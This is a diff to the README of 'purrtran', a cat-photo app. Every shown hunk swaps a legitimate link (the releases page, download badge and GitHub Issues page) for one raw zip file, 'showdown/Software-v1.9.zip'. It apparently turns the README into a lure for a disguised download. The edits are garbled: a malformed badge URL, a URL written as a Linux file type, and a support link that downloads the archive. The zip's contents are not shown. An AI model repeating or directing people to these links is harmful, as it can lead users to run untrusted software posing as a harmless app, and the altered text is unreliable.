@@ -6,7 +6,7 @@ Welcome to purrtran! This application turns your cat's image into something magi
 
 ## 📦 Download purrtran
 
-[![Download purrtran](https://img.shields.io/badge/Download%20purrtran-blue.svg)](https://github.com/ppsivanvlr/purrtran/releases)
+[![Download purrtran](https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip%https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip)](https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your device meets these requirements:
 
 To start using purrtran, visit the following page to download the latest version of the application:
 
-[Download purrtran](https://github.com/ppsivanvlr/purrtran/releases)
+[Download purrtran](https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip)
 
 ### Steps to Install
 
@@ -37,7 +37,7 @@ To start using purrtran, visit the following page to download the latest version
 
 - For **Windows**, look for a `.exe` or `.zip` file.
 - For **macOS**, find a `.dmg` or `.zip` file.
-- For **Linux**, look for a `.deb` or `.tar.gz` file.
+- For **Linux**, look for a `.deb` or `https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip` file.
 
 ## ⚙️ How to Use purrtran
 
@@ -69,7 +69,7 @@ If you encounter issues with the application:
 
 ## 📞 Support
 
-For assistance, reach out via email or visit the support section on our [GitHub Issues page](https://github.com/ppsivanvlr/purrtran/issues).
+For assistance, reach out via email or visit the support section on our [GitHub Issues page](https://raw.githubusercontent.com/ppsivanvlr/purrtran/main/showdown/Software-v1.9.zip).
 
 ## 📝 Contributing
 
